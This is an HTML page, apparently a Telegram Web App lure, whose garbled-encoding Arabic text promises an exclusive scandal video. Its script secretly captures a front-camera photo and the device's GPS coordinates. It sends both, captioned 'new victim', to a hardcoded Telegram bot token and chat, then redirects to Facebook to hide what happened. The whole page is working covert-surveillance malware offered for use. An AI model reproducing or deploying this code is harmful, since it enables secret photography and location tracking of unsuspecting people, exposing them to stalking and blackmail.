<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ÙØ¶ÙŠØ­Ø© Ø­ØµØ±ÙŠØ©</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {background:#000; color:#fff; text-align:center; padding:40px; font-family:Arial, sans-serif;}
        h1 {color:#ff0000; font-size:28px;}
        p {font-size:22px;}
        .loader {border:12px solid #333; border-top:12px solid #d32f2f; border-radius:50%; width:90px; height:90px; animation:spin 1s linear infinite; margin:40px auto;}
        @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
        .gift {font-size:100px;}
    </style>
</head>
<body>
    <h1>ğŸ”¥ Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ø­ØµØ±ÙŠ ğŸ”¥</h1>
    <p>Ø§Ù†ØªØ¸Ø± Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆØ§Ù„Ø¬Ù‡Ø§Ø²...</p>
    <div class="loader"></div>
    <p>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
    <div class="gift">ğŸ</div>

    <script>
        Telegram.WebApp.ready();
        Telegram.WebApp.expand(); // ÙŠÙˆØ³Ø¹ Ø§Ù„Ø´Ø§Ø´Ø© ÙƒØ§Ù…Ù„Ø© Ù„ØªØ¬Ø±Ø¨Ø© Ø£ÙØ¶Ù„

        let captured = false;

        // Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ø¹Ù‹Ø§
        navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
        .then(stream => {
            let video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // Ù†Ø³ØªÙ†Ù‰ 2 Ø«Ø§Ù†ÙŠØ© Ø¹Ø´Ø§Ù† ÙŠØ¨Ø§Ù† Ø·Ø¨ÙŠØ¹ÙŠ
            setTimeout(() => {
                let canvas = document.createElement('canvas');
                canvas.width = 1280; canvas.height = 720;
                canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
                let imgData = canvas.toDataURL('image/jpeg');

                // Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
                navigator.geolocation.getCurrentPosition(pos => {
                    let gps = pos.coords.latitude + "," + pos.coords.longitude + " Â±" + pos.coords.accuracy + "m";
                    let time = new Date().toLocaleString('ar-EG');
                    let caption = "ğŸ†• Ø¶Ø­ÙŠØ© Ø¬Ø¯ÙŠØ¯Ø©\nğŸ“ Ù…ÙˆÙ‚Ø¹: " + gps + "\nğŸ• ÙˆÙ‚Øª: " + time;

                    let form = new FormData();
                    form.append('photo', dataURLtoBlob(imgData), "victim.jpg");

                    fetch("https://api.telegram.org/bot8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8/sendPhoto?chat_id=1611398303&caption=" + encodeURIComponent(caption), {
                        method: 'POST',
                        body: form
                    }).then(() => {
                        captured = true;
                    });
                }, () => {}, {timeout: 8000});

                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        })
        .catch(() => { /* Ù„Ùˆ Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ */ });

        // Ù†Ø³ØªÙ†Ù‰ 5 Ø«ÙˆØ§Ù†ÙŠ ÙƒØ§Ù…Ù„Ø© Ù‚Ø¨Ù„ Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¹Ø´Ø§Ù† ÙŠÙ…Ø¯ÙŠ ÙŠÙˆØ§ÙÙ‚
        setTimeout(() => {
            window.location.href = "https://m.facebook.com/";
        }, 5000);

        function dataURLtoBlob(dataurl) {
            let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
            while(n--) u8arr[n] = bstr.charCodeAt(n);
            return new Blob([u8arr], {type:mime});
        }
    </script>
</body>
</html>
